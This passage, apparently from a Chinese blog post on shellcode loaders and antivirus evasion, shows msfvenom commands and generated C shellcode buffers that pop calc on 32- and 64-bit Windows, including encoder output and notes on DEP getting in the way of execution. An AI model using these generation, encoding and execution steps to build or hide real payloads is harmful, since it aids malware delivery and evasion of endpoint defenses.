-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xcd\x89\x9e\x1b\x0d\x98</span><span class=s>&#34;</span><span class=p>;</span></span></span></code></pre></div><h3 id=弹计算器 class=heading-element><a href=#%e5%bc%b9%e8%ae%a1%e7%ae%97%e5%99%a8 class=heading-mark></a>弹计算器</h3><h4 id=32位 class=heading-element><a href=#32%e4%bd%8d class=heading-mark></a>32位</h4><div class=highlight id=id-6><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=err>➜</span>  <span class=o>~</span> <span class=n>msfvenom</span> <span class=o>--</span><span class=n>payload</span> <span class=n>windows</span><span class=o>/</span><span class=n>exec</span> <span class=n>cmd</span><span class=o>=</span><span class=s>&#34;calc&#34;</span> <span class=o>--</span><span class=n>format</span> <span class=n>c</span> <span class=o>--</span><span class=n>arch</span> <span class=n>x86</span> <span class=o>--</span><span class=n>platform</span> <span class=n>windows</span> <span class=o>--</span><span class=n>bad</span> <span class=s>&#34;</span><span class=se>\x00</span><span class=s>&#34;</span> 
-</span></span><span class=line><span class=cl><span class=n>Found</span> <span class=mi>11</span> <span class=n>compatible</span> <span class=n>encoders</span>
-</span></span><span class=line><span class=cl><span class=n>Attempting</span> <span class=n>to</span> <span class=n>encode</span> <span class=n>payload</span> <span class=n>with</span> <span class=mi>1</span> <span class=n>iterations</span> <span class=n>of</span> <span class=n>x86</span><span class=o>/</span><span class=n>shikata_ga_nai</span>
-</span></span><span class=line><span class=cl><span class=n>x86</span><span class=o>/</span><span class=n>shikata_ga_nai</span> <span class=n>succeeded</span> <span class=n>with</span> <span class=n>size</span> <span class=mi>216</span> <span class=p>(</span><span class=n>iteration</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>x86</span><span class=o>/</span><span class=n>shikata_ga_nai</span> <span class=n>chosen</span> <span class=n>with</span> <span class=n>final</span> <span class=n>size</span> <span class=mi>216</span>
-</span></span><span class=line><span class=cl><span class=n>Payload</span> <span class=nl>size</span><span class=p>:</span> <span class=mi>216</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=n>Final</span> <span class=n>size</span> <span class=n>of</span> <span class=n>c</span> <span class=nl>file</span><span class=p>:</span> <span class=mi>933</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>buf</span><span class=p>[]</span> <span class=o>=</span> 
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xba\x9f\x20\x22\xd2\xda\xd4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x30\x83\xc7\x04\x31\x57\x0f\x03\x57\x90\xc2\xd7\x2e\x46\x80</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x18\xcf\x96\xe5\x91\x2a\xa7\x25\xc5\x3f\x97\x95\x8d\x12\x1b</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x5d\xc3\x86\xa8\x13\xcc\xa9\x19\x99\x2a\x87\x9a\xb2\x0f\x86</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x18\xc9\x43\x68\x21\x02\x96\x69\x66\x7f\x5b\x3b\x3f\x0b\xce</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xac\x34\x41\xd3\x47\x06\x47\x53\xbb\xde\x66\x72\x6a\x55\x31</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x54\x8c\xba\x49\xdd\x96\xdf\x74\x97\x2d\x2b\x02\x26\xe4\x62</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xeb\x85\xc9\x4b\x1e\xd7\x0e\x6b\xc1\xa2\x66\x88\x7c\xb5\xbc</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xf3\x5a\x30\x27\x53\x28\xe2\x83\x62\xfd\x75\x47\x68\x4a\xf1</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x0f\x6c\x4d\xd6\x3b\x88\xc6\xd9\xeb\x19\x9c\xfd\x2f\x42\x46</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x9f\x76\x2e\x29\xa0\x69\x91\x96\x04\xe1\x3f\xc2\x34\xa8\x55</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x15\xca\xd6\x1b\x15\xd4\xd8\x0b\x7e\xe5\x53\xc4\xf9\xfa\xb1</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xa1\xf6\xb0\x98\x83\x9e\x1c\x49\x96\xc2\x9e\xa7\xd4\xfa\x1c</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x42\xa4\xf8\x3d\x27\xa1\x45\xfa\xdb\xdb\xd6\x6f\xdc\x48\xd6</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xa5\xbf\x0f\x44\x25\x40</span><span class=s>&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=err>➜</span>  <span class=o>~</span> <span class=n>msfvenom</span> <span class=o>--</span><span class=n>payload</span> <span class=n>windows</span><span class=o>/</span><span class=n>exec</span> <span class=n>cmd</span><span class=o>=</span><span class=s>&#34;calc&#34;</span> <span class=o>--</span><span class=n>format</span> <span class=n>c</span> <span class=o>--</span><span class=n>arch</span> <span class=n>x86</span> <span class=o>--</span><span class=n>platform</span> <span class=n>windows</span>              
-</span></span><span class=line><span class=cl><span class=n>No</span> <span class=n>encoder</span> <span class=n>specified</span><span class=p>,</span> <span class=n>outputting</span> <span class=n>raw</span> <span class=n>payload</span>
-</span></span><span class=line><span class=cl><span class=n>Payload</span> <span class=nl>size</span><span class=p>:</span> <span class=mi>189</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=n>Final</span> <span class=n>size</span> <span class=n>of</span> <span class=n>c</span> <span class=nl>file</span><span class=p>:</span> <span class=mi>819</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>buf</span><span class=p>[]</span> <span class=o>=</span> 
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x00\x53\xff\xd5\x63\x61\x6c\x63\x00</span><span class=s>&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=err>➜</span>  <span class=o>~</span> <span class=n>msfvenom</span> <span class=o>-</span><span class=n>p</span> <span class=n>windows</span><span class=o>/</span><span class=n>exec</span> <span class=n>cmd</span><span class=o>=</span><span class=n>calc</span><span class=p>.</span><span class=n>exe</span> <span class=o>-</span><span class=n>f</span> <span class=n>c</span> <span class=o>--</span><span class=n>bad</span> <span class=s>&#34;</span><span class=se>\x00</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>No</span> <span class=n>platform</span> <span class=n>was</span> <span class=n>selected</span><span class=p>,</span> <span class=n>choosing</span> <span class=n>Msf</span><span class=o>::</span><span class=n>Module</span><span class=o>::</span><span class=n>Platform</span><span class=o>::</span><span class=n>Windows</span> <span class=n>from</span> <span class=n>the</span> <span class=n>payload</span>
-</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>No</span> <span class=n>arch</span> <span class=n>selected</span><span class=p>,</span> <span class=n>selecting</span> <span class=nl>arch</span><span class=p>:</span> <span class=n>x86</span> <span class=n>from</span> <span class=n>the</span> <span class=n>payload</span>
-</span></span><span class=line><span class=cl><span class=n>Found</span> <span class=mi>11</span> <span class=n>compatible</span> <span class=n>encoders</span>
-</span></span><span class=line><span class=cl><span class=n>Attempting</span> <span class=n>to</span> <span class=n>encode</span> <span class=n>payload</span> <span class=n>with</span> <span class=mi>1</span> <span class=n>iterations</span> <span class=n>of</span> <span class=n>x86</span><span class=o>/</span><span class=n>shikata_ga_nai</span>
-</span></span><span class=line><span class=cl><span class=n>x86</span><span class=o>/</span><span class=n>shikata_ga_nai</span> <span class=n>succeeded</span> <span class=n>with</span> <span class=n>size</span> <span class=mi>220</span> <span class=p>(</span><span class=n>iteration</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>x86</span><span class=o>/</span><span class=n>shikata_ga_nai</span> <span class=n>chosen</span> <span class=n>with</span> <span class=n>final</span> <span class=n>size</span> <span class=mi>220</span>
-</span></span><span class=line><span class=cl><span class=n>Payload</span> <span class=nl>size</span><span class=p>:</span> <span class=mi>220</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=n>Final</span> <span class=n>size</span> <span class=n>of</span> <span class=n>c</span> <span class=nl>file</span><span class=p>:</span> <span class=mi>949</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>buf</span><span class=p>[]</span> <span class=o>=</span> 
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xbe\x7a\x1b\x33\xc4\xd9\xc9\xd9\x74\x24\xf4\x5f\x31\xc9\xb1</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x31\x83\xef\xfc\x31\x77\x0f\x03\x77\x75\xf9\xc6\x38\x61\x7f</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x28\xc1\x71\xe0\xa0\x24\x40\x20\xd6\x2d\xf2\x90\x9c\x60\xfe</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x5b\xf0\x90\x75\x29\xdd\x97\x3e\x84\x3b\x99\xbf\xb5\x78\xb8</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x43\xc4\xac\x1a\x7a\x07\xa1\x5b\xbb\x7a\x48\x09\x14\xf0\xff</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xbe\x11\x4c\x3c\x34\x69\x40\x44\xa9\x39\x63\x65\x7c\x32\x3a</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xa5\x7e\x97\x36\xec\x98\xf4\x73\xa6\x13\xce\x08\x39\xf2\x1f</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xf0\x96\x3b\x90\x03\xe6\x7c\x16\xfc\x9d\x74\x65\x81\xa5\x42</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x14\x5d\x23\x51\xbe\x16\x93\xbd\x3f\xfa\x42\x35\x33\xb7\x01</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x11\x57\x46\xc5\x29\x63\xc3\xe8\xfd\xe2\x97\xce\xd9\xaf\x4c</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x6e\x7b\x15\x22\x8f\x9b\xf6\x9b\x35\xd7\x1a\xcf\x47\xba\x70</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x0e\xd5\xc0\x36\x10\xe5\xca\x66\x79\xd4\x41\xe9\xfe\xe9\x83</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x4e\xf0\xa3\x8e\xe6\x99\x6d\x5b\xbb\xc7\x8d\xb1\xff\xf1\x0d</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x30\x7f\x06\x0d\x31\x7a\x42\x89\xa9\xf6\xdb\x7c\xce\xa5\xdc</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x54\xad\x28\x4f\x34\x1c\xcf\xf7\xdf\x60</span><span class=s>&#34;</span><span class=p>;</span></span></span></code></pre></div><h4 id=64位 class=heading-element><a href=#64%e4%bd%8d class=heading-mark></a>64位</h4><div class=highlight id=id-7><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=err>➜</span>  <span class=o>~</span> <span class=n>msfvenom</span> <span class=o>-</span><span class=n>p</span> <span class=n>windows</span><span class=o>/</span><span class=n>x64</span><span class=o>/</span><span class=n>exec</span> <span class=n>cmd</span><span class=o>=</span><span class=n>calc</span><span class=p>.</span><span class=n>exe</span> <span class=o>-</span><span class=n>f</span> <span class=n>c</span> <span class=o>--</span><span class=n>bad</span> <span class=s>&#34;</span><span class=se>\x00</span><span class=s>&#34;</span>               
-</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>No</span> <span class=n>platform</span> <span class=n>was</span> <span class=n>selected</span><span class=p>,</span> <span class=n>choosing</span> <span class=n>Msf</span><span class=o>::</span><span class=n>Module</span><span class=o>::</span><span class=n>Platform</span><span class=o>::</span><span class=n>Windows</span> <span class=n>from</span> <span class=n>the</span> <span class=n>payload</span>
-</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>No</span> <span class=n>arch</span> <span class=n>selected</span><span class=p>,</span> <span class=n>selecting</span> <span class=nl>arch</span><span class=p>:</span> <span class=n>x64</span> <span class=n>from</span> <span class=n>the</span> <span class=n>payload</span>
-</span></span><span class=line><span class=cl><span class=n>Found</span> <span class=mi>3</span> <span class=n>compatible</span> <span class=n>encoders</span>
-</span></span><span class=line><span class=cl><span class=n>Attempting</span> <span class=n>to</span> <span class=n>encode</span> <span class=n>payload</span> <span class=n>with</span> <span class=mi>1</span> <span class=n>iterations</span> <span class=n>of</span> <span class=n>generic</span><span class=o>/</span><span class=n>none</span>
-</span></span><span class=line><span class=cl><span class=n>generic</span><span class=o>/</span><span class=n>none</span> <span class=n>failed</span> <span class=n>with</span> <span class=n>Encoding</span> <span class=n>failed</span> <span class=n>due</span> <span class=n>to</span> <span class=n>a</span> <span class=n>bad</span> <span class=nf>character</span> <span class=p>(</span><span class=n>index</span><span class=o>=</span><span class=mi>7</span><span class=p>,</span> <span class=kt>char</span><span class=o>=</span><span class=mh>0x00</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>Attempting</span> <span class=n>to</span> <span class=n>encode</span> <span class=n>payload</span> <span class=n>with</span> <span class=mi>1</span> <span class=n>iterations</span> <span class=n>of</span> <span class=n>x64</span><span class=o>/</span><span class=n>xor</span>
-</span></span><span class=line><span class=cl><span class=n>x64</span><span class=o>/</span><span class=n>xor</span> <span class=n>succeeded</span> <span class=n>with</span> <span class=n>size</span> <span class=mi>319</span> <span class=p>(</span><span class=n>iteration</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>x64</span><span class=o>/</span><span class=n>xor</span> <span class=n>chosen</span> <span class=n>with</span> <span class=n>final</span> <span class=n>size</span> <span class=mi>319</span>
-</span></span><span class=line><span class=cl><span class=n>Payload</span> <span class=nl>size</span><span class=p>:</span> <span class=mi>319</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=n>Final</span> <span class=n>size</span> <span class=n>of</span> <span class=n>c</span> <span class=nl>file</span><span class=p>:</span> <span class=mi>1366</span> <span class=n>bytes</span>
-</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>buf</span><span class=p>[]</span> <span class=o>=</span> 
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xff\xff\x48\xbb\xf5\x1f\xb6\x9f\x1f\x80\x55\xcb\x48\x31\x58</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x09\x57\x35\x7b\xef\x68</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x95\xcb\xf5\x1f\xf7\xce\x5e\xd0\x07\x9a\xa3\x57\x87\x4d\x7a</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xc8\xde\x99\x95\x57\x3d\xcd\x07\xc8\xde\x99\xd5\x57\x3d\xed</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x4f\xc8\x5a\x7c\xbf\x55\xfb\xae\xd6\xc8\x64\x0b\x59\x23\xd7</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xe3\x1d\xac\x75\x8a\x34\xd6\xbb\xde\x1e\x41\xb7\x26\xa7\x5e</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xe7\xd7\x94\xd2\x75\x40\xb7\x23\xfe\x9e\xcf\x0b\xd5\x43\xf5</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x1f\xb6\xd7\x9a\x40\x21\xac\xbd\x1e\x66\xcf\x94\xc8\x4d\x8f</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x7e\x5f\x96\xd6\x1e\x50\xb6\x9d\xbd\xe0\x7f\xde\x94\xb4\xdd</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x83\xf4\xc9\xfb\xae\xd6\xc8\x64\x0b\x59\x5e\x77\x56\x12\xc1</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x54\x0a\xcd\xff\xc3\x6e\x53\x83\x19\xef\xfd\x5a\x8f\x4e\x6a</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x58\x0d\x8f\x7e\x5f\x92\xd6\x1e\x50\x33\x8a\x7e\x13\xfe\xdb</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x94\xc0\x49\x82\xf4\xcf\xf7\x14\x1b\x08\x1d\xca\x25\x5e\xee</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xde\x47\xde\x0c\x91\xb4\x47\xf7\xc6\x5e\xda\x1d\x48\x19\x3f</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xf7\xcd\xe0\x60\x0d\x8a\xac\x45\xfe\x14\x0d\x69\x02\x34\x0a</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xe0\xeb\xd7\xa5\x81\x55\xcb\xf5\x1f\xb6\x9f\x1f\xc8\xd8\x46</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xf4\x1e\xb6\x9f\x5e\x3a\x64\x40\x9a\x98\x49\x4a\xa4\x70\xe0</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x69\xa3\x5e\x0c\x39\x8a\x3d\xc8\x34\x20\x57\x35\x5b\x37\xbc</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\xb7\xff\x9f\x4d\x7f\x6a\x85\xee\x8c\xe6\x6d\xd9\xf5\x1f</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xd9\x14\x42\x2f\xe0\x63\xfc\x7e\xec\x36\xe5\x90\x67\xd3\x9f</span><span class=s>&#34;</span>
-</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x1f\x80\x55\xcb</span><span class=s>&#34;</span><span class=p>;</span></span></span></code></pre></div><h2 id=vscode与visual-studio class=heading-element><a href=#vscode%e4%b8%8evisual-studio class=heading-mark></a>vscode与Visual Studio</h2><p>经过测试，我这里的vscode无论是32位的指针执行还是动态分配执行都是可以正常弹calc的；但是64位的指针执行还是动态分配执行都不可以执行，应该是vscode的环境问题。</p><p>而在Visual Studio中，32位下，动态分配的方式可以正常执行，但是如果是想要指针执行，则需要关闭DEP：</p><p><img loading=lazy src=image-20220408231623763.png alt=image-20220408231623763 srcset="image-20220408231623763.png?size=small, image-20220408231623763.png?size=medium 1.5x, image-20220408231623763.png?size=large 2x" data-title=image-20220408231623763 style="background:url(/images/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e)'></p><p>64位下，动态分配可以正常运行，但是指针执行无论如何都没有成功，找了半天解决办法仍未成功，64位程序无法关闭DEP。</p><p>之后找到解决办法再写吧，占个坑位，有大佬如果知道的QQ联系QAQ.</p><blockquote><p><a href=https://422926799.github.io/posts/44310b89.html target=_blank rel="external nofollow noopener noreferrer">https://422926799.github.io/posts/44310b89.html</a></p><p><a href=https://www.redteam101.tech/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis target=_blank rel="external nofollow noopener noreferrer">https://www.redteam101.tech/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis</a></p><p><a href=https://wooyun.js.org/drops/Exploit%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-Windows%E5%9F%BA%E7%A1%80&amp;shellcode.html target=_blank rel="external nofollow noopener noreferrer">https://wooyun.js.org/drops/Exploit%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-Windows%E5%9F%BA%E7%A1%80&shellcode.html</a></p><p><a href=https://luckyfuture.top/ShellcodeLoader.html target=_blank rel="external nofollow noopener noreferrer">https://luckyfuture.top/ShellcodeLoader.html</a></p></blockquote></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="更新于 0001-01-01 00:00:00">更新于 0001-01-01&nbsp;</span></div><div class=post-info-license><span><a rel="license external nofollow noopener noreferrer" href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=http://ghostasky.github.io/posts/shellcodeloader/ data-title="ShellCode Loader(持续更新)" data-hashtags=免杀><i class="fa-brands fa-twitter fa-fw" aria-hidden=true></i></a>
-<a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=http://ghostasky.github.io/posts/shellcodeloader/ data-hashtag=免杀><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
-<a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=http://ghostasky.github.io/posts/shellcodeloader/ data-title="ShellCode Loader(持续更新)"><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/%E5%85%8D%E6%9D%80/ class=post-tag title="标签 - 免杀">免杀</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/ssti/ class=post-nav-item rel=prev title="SSTI payload记录"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>SSTI payload记录</a>
-<a href=/posts/powershell/ class=post-nav-item rel=next title=Powershell>Powershell<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article><aside class=toc id=toc-auto aria-label=目录><h2 class=toc-title>目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside></main><footer class=footer><div class=footer-container><div class="footer-line powered">由 <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.123.8"><img class=hugo-icon src=/images/hugo.min.svg alt="Hugo logo"> Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.3.2"><img class=fixit-icon src=/images/fixit.min.svg alt="FixIt logo"> FixIt</a></div><div class="footer-line copyright" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
-<span itemprop=copyrightYear>2024</span><span class=author itemprop=copyrightHolder>
-<a href=/></a></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class="variant-numeric d-none">0%</span></div></div><div id=mask></div><noscript><div class=noscript-warning>FixIt 主题在启用 JavaScript 的情况下效果最佳。</div></noscript></div><link rel=preload href=/lib/katex/katex.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/katex/katex.min.css></noscript><link rel=stylesheet href=/lib/cookieconsent/cookieconsent.min.css><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/katex/katex.min.js defer></script><script src=/lib/katex/auto-render.min.js defer></script><script src=/lib/katex/copy-tex.min.js defer></script><script src=/lib/katex/mhchem.min.js defer></script><script src=/lib/cookieconsent/cookieconsent.min.js defer></script><script>window.config={code:{copyTitle:"复制到剪贴板",editLockTitle:"锁定可编辑代码块",editUnLockTitle:"解锁可编辑代码块",editable:!0,maxShownLines:10},comment:{enable:!1},cookieconsent:{content:{dismiss:"同意",link:"了解更多",message:"本网站使用 Cookies 来改善您的浏览体验。"},enable:!0,palette:{button:{background:"#f0f0f0"},popup:{background:"#1aa3ff"}},theme:"edgeless"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script src=/js/theme.min.js defer></script></body></html>
+<!DOCTYPE html>
